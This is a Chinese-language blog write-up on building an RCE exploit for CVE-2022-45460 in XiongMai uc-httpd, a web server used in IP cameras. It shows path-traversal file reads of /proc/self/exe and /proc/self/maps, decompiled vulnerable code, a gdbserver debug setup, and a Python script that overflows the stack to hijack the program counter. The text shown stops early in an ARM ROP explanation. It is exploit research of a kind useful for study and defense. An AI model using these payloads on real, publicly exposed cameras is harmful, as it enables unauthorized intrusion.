

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/dog2.jpg">
  <link rel="icon" href="/img/dog2.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Jentle">
  <meta name="keywords" content="">
  
    <meta name="description" content="一次渗透过程中的CVE-2022-45460撞洞RCE在一次渗透中我们遇到了雄迈（XiongMai）的uc-httpd，这是一款被全球无数网络摄像机使用的轻量级Web服务器。根据Shodan的数据，大约有7万个该软件的实例在互联网上公开暴露。尽管这款软件存在严重的历史漏洞，但似乎没有现成的漏洞利用代码能够RCE，于是我决定自己构建一个。 最初的计划是针对CVE-2018-10088这个漏洞展开攻击">
<meta property="og:type" content="article">
<meta property="og:title" content="一次渗透过程中的CVE-2022-45460撞洞RCE">
<meta property="og:url" content="http://example.com/2025/02/11/%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84CVE-2022-45460%E6%92%9E%E6%B4%9ERCE/index.html">
<meta property="og:site_name" content="TIPFactory">
<meta property="og:description" content="一次渗透过程中的CVE-2022-45460撞洞RCE在一次渗透中我们遇到了雄迈（XiongMai）的uc-httpd，这是一款被全球无数网络摄像机使用的轻量级Web服务器。根据Shodan的数据，大约有7万个该软件的实例在互联网上公开暴露。尽管这款软件存在严重的历史漏洞，但似乎没有现成的漏洞利用代码能够RCE，于是我决定自己构建一个。 最初的计划是针对CVE-2018-10088这个漏洞展开攻击">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/img/postindex/CVE-2022-45460.png">
<meta property="article:published_time" content="2025-02-11T09:14:05.000Z">
<meta property="article:modified_time" content="2025-02-11T09:21:52.553Z">
<meta property="article:author" content="Jentle">
<meta property="article:tag" content="主机安全">
<meta property="article:tag" content="漏洞挖掘">
<meta property="article:tag" content="ARM">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/postindex/CVE-2022-45460.png">
  
  
  
  <title>一次渗透过程中的CVE-2022-45460撞洞RCE - TIPFactory</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="TIPFactory" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>TIPFactory</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="一次渗透过程中的CVE-2022-45460撞洞RCE"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-02-11 17:14" pubdate>
          February 11, 2025 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          5.8k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          49 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">一次渗透过程中的CVE-2022-45460撞洞RCE</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="一次渗透过程中的CVE-2022-45460撞洞RCE"><a href="#一次渗透过程中的CVE-2022-45460撞洞RCE" class="headerlink" title="一次渗透过程中的CVE-2022-45460撞洞RCE"></a>一次渗透过程中的CVE-2022-45460撞洞RCE</h1><p>在一次渗透中我们遇到了雄迈（XiongMai）的uc-httpd，这是一款被全球无数网络摄像机使用的轻量级Web服务器。根据Shodan的数据，大约有7万个该软件的实例在互联网上公开暴露。尽管这款软件存在严重的历史漏洞，但似乎没有现成的漏洞利用代码能够RCE，于是我决定自己构建一个。</p>
<p>最初的计划是针对CVE-2018-10088这个漏洞展开攻击，它是一个缓冲区溢出漏洞，现有的利用代码只能使服务器崩溃，却无法实现RCE。我发现了新的攻击路径并构建了一个ROP链，通过Web请求发送ROP链，并利用同一连接作为命令执行的通道。毕竟，谁说一定要用反向Shell呢？</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在对任何漏洞进行利用之前，我们需要先了解这个漏洞。所以，首要任务是获取uc-http的源代码或编译后的二进制文件。不出所料，这款软件不是开源的。但幸运的是，存在CVE-2017-7577这个非常容易利用的路径遍历漏洞，它允许从受影响的uc-http服务器下载任意文件。通过<code>/proc/self/exe</code>，我们可以下载当前正在运行的可执行文件（通常名为<strong>Sofia</strong>）进行分析。</p>
<p>我像往常一样使用<code>file</code>和<code>checksec</code>工具对目标二进制文件进行检查。从下面的结果可以看出，它是一个32位ARM架构的动态链接可执行文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ file Sofia<br>Sofia: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped<br><br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ checksec --file=Sofia<br>RELRO           STACK CANARY      NX            PIE<br>No RELRO        No canary found   NX disabled   No PIE<br><br></code></pre></td></tr></table></figure>

<p>它没有启用重定位只读（RELRO），这意味着全局偏移表（GOT）是可写的；没有栈保护（stack canary）来检测栈溢出；并且禁用了不可执行（NX）保护，这使得可以在栈上执行Shellcode。此外，由于它不是位置无关可执行文件（PIE），所以二进制文件总是被加载到固定的地址。</p>
<p>我使用Ghidra对二进制文件进行反编译。通过将触发现有漏洞利用代码时二进制文件的日志输出，与二进制文件中的字符串进行交叉引用，我找到了一个看起来像是HTTP调度器的函数（稍后会详细介绍具体的调试环境）。</p>
<p>Sofia二进制文件的HTTP调度器反编译代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">dispatcher</span><span class="hljs-params">(FILE *socket_stream, byte *request)</span><br>&#123;<br>    <span class="hljs-type">char</span> *substring;<br>    <span class="hljs-type">int</span> iVarl;<br>    <span class="hljs-type">char</span> *pcVar2;<br>    uint uVar5;<br>    <span class="hljs-type">size_t</span> sVar3;<br>    <span class="hljs-type">size_t</span> sVar4;<br>    byte *position;<br>    byte *__s1;<br>    byte *uri;<br>    <span class="hljs-type">char</span> filepath [<span class="hljs-number">128</span>];<br>    stat stat_struct;<br>    undefined4 uStack_68;<br>    <span class="hljs-type">int</span> local_64;<br>    undefined4 local_60;<br>    undefined4 uStack_5c;<br>    undefined4 local_28;<br>    <span class="hljs-type">int</span> local_24;<br>    <span class="hljs-built_in">memset</span> (filepath, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>);<br>    substring = <span class="hljs-built_in">strstr</span>((<span class="hljs-type">char</span> *)request, <span class="hljs-string">&quot; /webcapture.jpg?&quot;</span>);<br>    <span class="hljs-keyword">if</span> (substring ==(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>) &#123;<br>LAB_00337dc8:<br>LAB_00338108:<br>        substring = <span class="hljs-built_in">strstr</span> ((<span class="hljs-type">char</span> *)request, <span class="hljs-string">&quot;command=&quot;</span>);<br>        <span class="hljs-keyword">if</span> (substring ==(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>)&#123;<br>            DAT_006e9324 =<span class="hljs-number">0xffffffff</span>;<br>            <span class="hljs-keyword">if</span> (socket_stream ==(FILE *)<span class="hljs-number">0x0</span> || request ==(byte *)<span class="hljs-number">0x0</span>)<br>                <span class="hljs-keyword">goto</span> LAB_0033838c;<br>            <span class="hljs-keyword">do</span> &#123;<br>                request = request + <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">while</span> (*request !=<span class="hljs-number">0x20</span>);<br>            uVar5=<span class="hljs-number">0x20</span>;<br>            <span class="hljs-keyword">if</span> ((*(ushort *)(__ctype_b + <span class="hljs-number">0x40</span>) &amp; <span class="hljs-number">0x20</span>) !=<span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                    request = request + <span class="hljs-number">1</span>;<br>                    uVar5 =(uint)*request;<br>                &#125; <span class="hljs-keyword">while</span> ((*(ushort *) (uvar5 * <span class="hljs-number">2</span>+_ctype_b) &amp; <span class="hljs-number">0</span>x <span class="hljs-number">20</span>) !=<span class="hljs-number">0</span>);<br>            &#125;<br>            <span class="hljs-keyword">while</span> (uVar5 == <span class="hljs-number">0x2f</span>) &#123;<br>                request = request + <span class="hljs-number">1</span>;<br>                uVar5 =(uint)*request;<br>            &#125;<br><br></code></pre></td></tr></table></figure>

<p>在这个函数中，CVE-2018-10088漏洞很容易被发现。常见的<code>strcpy</code>函数被用于将HTTP请求体中的<code>username</code>和<code>password</code>参数复制到某些数据段中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">substring = strtok((<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>,<span class="hljs-string">&quot;&amp;&quot;</span>);<br><span class="hljs-built_in">strcpy</span>(&amp;DATA_USERNAME,substring + <span class="hljs-number">9</span>);<br>substring = strtok((<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>,<span class="hljs-string">&quot;&amp;&quot;</span>);<br><span class="hljs-built_in">strcpy</span>(&amp;DATA_PASSWORD,substring + <span class="hljs-number">9</span>)<br><br></code></pre></td></tr></table></figure>

<p>通过检查这些数据段，我发现这些缓冲区的长度均为20字节。因此，超过20个字符的用户名和密码会导致相应的缓冲区溢出。我还发现这些缓冲区位于二进制文件的<code>.bss</code>数据段中，这对于劫持程序执行来说并不是一个理想的位置。不过，我注意到在该数据段的更下方有一些函数指针，可以利用这个溢出进行覆盖，理论上这可以实现程序执行流程的重定向。</p>
<p>然而，在浏览调度器函数的其余部分时，我发现了另一个漏洞（后来我才知道它是CVE-2022-45460），这个漏洞似乎更符合我的目标。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">iVar1 = <span class="hljs-built_in">strcmp</span>((<span class="hljs-type">char</span> *)__s1,<span class="hljs-string">&quot;.lang&quot;</span>);<br><span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">sprintf</span>(filepath,<span class="hljs-string">&quot;%s/%s&quot;</span>,<span class="hljs-string">&quot;/mnt/custom&quot;</span>,&amp;DAT_FILEPATH);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    substring = <span class="hljs-built_in">strstr</span>((<span class="hljs-type">char</span> *)uri,<span class="hljs-string">&quot;mns.cab&quot;</span>);<br>    <span class="hljs-keyword">if</span> (substring == (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>) &#123;<br>        <span class="hljs-built_in">strstr</span>((<span class="hljs-type">char</span> *)uri,<span class="hljs-string">&quot;logo/&quot;</span>);<br>        <span class="hljs-built_in">sprintf</span>(filepath,<span class="hljs-string">&quot;%s/%s&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">sprintf</span>(filepath,<span class="hljs-string">&quot;%s/%s&quot;</span>,<span class="hljs-string">&quot;/usr/mobile&quot;</span>,uri);<br>    &#125;<br>&#125;<br>iVar1 = stat(filepath,&amp;stat_struct);<br><span class="hljs-keyword">if</span> (iVar1 != <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">if</span> ((filepath[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;\\0&#x27;</span>) &amp;&amp; (iVar1 = atoi(filepath), <span class="hljs-number">0</span> &lt; iVar1)) &#123;<br>        DAT_006e9324 = iVar1;<br>        <span class="hljs-built_in">sprintf</span>((<span class="hljs-type">char</span> *)&amp;uStack_68,<span class="hljs-string">&quot;.%s&quot;</span>,<span class="hljs-string">&quot;/index.htm&quot;</span>);<br>        FUN_003376cc(socket_stream,&amp;uStack_68,<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    write_response_header(socket_stream,<span class="hljs-number">0x68</span>);<br>    fwrite(<span class="hljs-string">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 File Not Found&lt;/title&gt;&lt;/head&gt;\\n&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x35</span>,socket_stream);<br>    fwrite(<span class="hljs-string">&quot;&lt;body&gt;The requested URL was not found on this server&lt;/body&gt;&lt;/html&gt;\\n&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x43</span>,socket_stream);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>这段代码显示，URI和文件路径使用<code>sprintf</code>函数进行拼接，同样没有进行任何边界检查。特别值得注意的是，用户控制的URI与<code>/usr/mobile</code>字符串拼接的分支。在这种情况下，溢出发生在一个我称之为<code>filepath</code>的栈变量上。栈溢出的危害很大，因为通常函数返回地址存储在栈上，这使得在溢出过程中可以覆盖返回地址，从而重定向程序的执行流程。而且由于没有栈保护来阻止漏洞利用，这个漏洞应该比较容易被利用。</p>
<h2 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h2><p>在深入研究漏洞利用之前，我想搭建一个专门的测试环境用于调试。我的目标是避免依赖任何硬件设备。由于没有使用现有的漏洞利用代码，我也无法访问设备来部署调试器。</p>
<p>所以，我首先利用前面提到的路径遍历漏洞转储文件系统。然后，我尝试使用<code>chroot</code>和QEMU的ARM系统模拟器来构建一个纯虚拟化环境。这个方法在一段时间内运行得很好，但最终在内存寻址方面出现了一些奇怪的行为。</p>
<p>我手头还有一台树莓派，所以我决定试试看。我将收集到的根文件系统复制到树莓派上，并获取静态的<code>gdbserver</code>和<code>bash</code>（<code>gdb</code>需要用到）二进制文件。然后，我在树莓派的<code>chroot</code>环境中启动<code>gdbserver</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">sudo</span> mount --<span class="hljs-built_in">bind</span> /proc/ rootfs/proc<br>mount: (hint) your fstab has been modified, but systemd still uses<br>       the old version; use <span class="hljs-string">&#x27;systemctl daemon-reload&#x27;</span> to reload.<br>pwn@raspberrypi:~ $ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chroot</span> rootfs/ sh<br><span class="hljs-comment"># ls</span><br>bin        dev        gdbserver  linuxrc    proc       tmp        utils<br>boot       etc        lib        mnt        sbin       usr        var<br><span class="hljs-comment"># ./gdbserver :8888 Sofia</span><br>Process Sofia created; pid = 911<br>Listening on port 8888<br>Remote debugging from host 192.168.2.1, port 64996<br><br></code></pre></td></tr></table></figure>

<p>然后，我在自己的机器上使用<code>gdb-multiarch</code>连接到它。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb-multiarch<br>GNU gdb (Debian 15.2-1+b1) 15.2<br>Copyright (C) 2024 Free Software Foundation, Inc.<br>(...)<br>gef➤ gef-remote 192.168.2.2 8888<br><br></code></pre></td></tr></table></figure>

<p>最终的调试环境大致如下：</p>
<pre><code class=" mermaid">graph LR

gdb-multiarch ----&gt;  gdbserver:8888-Sofia
</code></pre>

<p>这个环境允许在攻击者的机器上使用GEF（GDB Enhanced Features）设置断点，并远程调试树莓派上的目标程序，非常完美。</p>
<h2 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h2><p>搭建好上述环境后，就可以首次尝试触发已发现的漏洞了。这个过程和任何类似的二进制漏洞利用挑战没有太大区别。为了控制程序执行流程，我们首先需要确定输入在栈上覆盖的特定偏移量，这个偏移量最终会被弹出到程序计数器（PC）中。通过发送一个唯一的模式，并观察程序崩溃时哪些字节进入PC，我们可以精确找到这个偏移量。需要注意的是，始终要在URI末尾加上<code>.mns.cab</code>，以确保命中正确的代码路径。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> socket<br><br>payload = <span class="hljs-string">b&quot;&quot;</span><br>payload += <span class="hljs-number">304</span> * <span class="hljs-string">b&quot;A&quot;</span> + <span class="hljs-string">b&quot;BBBB&quot;</span><br><br><span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> sock:<br>    sock.connect((sys.argv[<span class="hljs-number">1</span>], <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])))<br>    sock.send(<span class="hljs-string">b&quot;GET /&quot;</span> + payload + <span class="hljs-string">b&quot;.mns.cab HTTP/1.1&quot;</span>)<br>    sock.send(<span class="hljs-string">b&quot;\\r\\n\\r\\n&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(sock.recv(<span class="hljs-number">1024</span>))<br><br></code></pre></td></tr></table></figure>

<p>为了观察服务器端的情况，我在漏洞代码段之后的返回语句处设置了一个断点，就在第二次调用<code>fwrite</code>之后。如下所示，寄存器 r4 到 r10 从栈中弹出，然后是 PC。使用上面的 Python 脚本，这些寄存器被字符 A 填充，而 PC 被设置为 BBBB，这标志着控制流劫持的入口点。</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/02/11/%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84CVE-2022-45460%E6%92%9E%E6%B4%9ERCE/image.png" class="" title="image">

<h2 id="构建漏洞利用代码"><a href="#构建漏洞利用代码" class="headerlink" title="构建漏洞利用代码"></a>构建漏洞利用代码</h2><p>此时，有几点需要说明。虽然NX保护被禁用，意味着栈应该是可执行的，但我对此并不确定。在我的树莓派测试环境中，栈总是被标记为<code>rw</code>，而不是<code>rwx</code>。从栈中执行Shellcode的尝试失败了。因此，我（错误地）认为在真实设备上也是如此。我没有对此深入思考，而是继续计划构建ROP链。</p>
<p>此外，虽然Sofia二进制文件本身没有启用PIE，但包含的库启用了PIE，因此我认为ASLR（地址空间布局随机化）也是启用的。在构建ROP链时，这意味着需要绕过ASLR，才能使用包含在库（如libc）中的gadgets。</p>
<p>另一个需要牢记的重要点是，由于我们利用<code>sprintf</code>函数造成溢出，所以有效载荷中不能包含空字节，否则会被截断。此外，在进一步检查反编译代码后，我发现空格也会被去除。</p>
<h3 id="绕过ASLR"><a href="#绕过ASLR" class="headerlink" title="绕过ASLR"></a>绕过ASLR</h3><p>由于Sofia二进制文件没有启用PIE，即使ASLR启用，它也总是被加载到相同的内存区域。然而，由于二进制文件映射在一个只占用地址空间低3字节的区域，每个地址的最高字节都包含一个空字节。这意味着，至少对于ROP链的入口点，不能使用Sofia二进制文件本身的gadgets。因此，我将重点放在包含的libc库上，但由于libc是使用PIE编译的，绕过ASLR就变得至关重要。</p>
<p>正如你可能猜到的，我们之前的路径遍历漏洞再次发挥了作用，这次是用来绕过ASLR。这并没有什么神奇之处，只需转储<code>/proc/self/maps</code>来获取Sofia进程的内存映射，从而确定所有包含库的基地址。</p>
<h3 id="ARM架构知识"><a href="#ARM架构知识" class="headerlink" title="ARM架构知识"></a>ARM架构知识</h3><p>由于构建ROP链需要了解底层架构，我们首先需要掌握一些ARM架构的基本概念。如果你已经熟悉这部分内容，可以跳过这部分。</p>
<p>ARM是一种RISC（精简指令集计算机）架构，与x86等复杂指令集相比，它使用一组更小的简单指令。ARM架构广泛应用于移动设备和嵌入式系统中。</p>
<p>ARM架构的一个独特之处是Thumb指令集。Thumb指令集是最常用的32位ARM指令的一个子集，每个指令只有16位长。这些指令与它们的32位对应指令具有相同的效果，但可以使代码更加紧凑、高效。ARM处理器在执行过程中可以在ARM模式和Thumb模式之间切换。</p>
<p>对于ROP链，ARM的调用约定尤为重要，因为它规定了函数参数的传递方式和控制流的管理方式。ARM有16个通用寄存器，从R0到R15。寄存器R0 - R3用于传递前四个函数参数，如果一个函数有超过四个参数，其余参数则放在栈上。R4 - R11用于在函数内部存储局部变量。函数的返回值存储在R0 - R3中。</p>
<p>在ARM中，跳转指令主要有四种类型：B、BL、BX和BLX。这些指令控制程序流程，并且在保存返回地址或在ARM和Thumb模式之间切换的能力上有所不同。下表总结了它们的属性：</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>功能</th>
<th>是否保存返回地址（LR）</th>
<th>是否可以切换指令集</th>
</tr>
</thead>
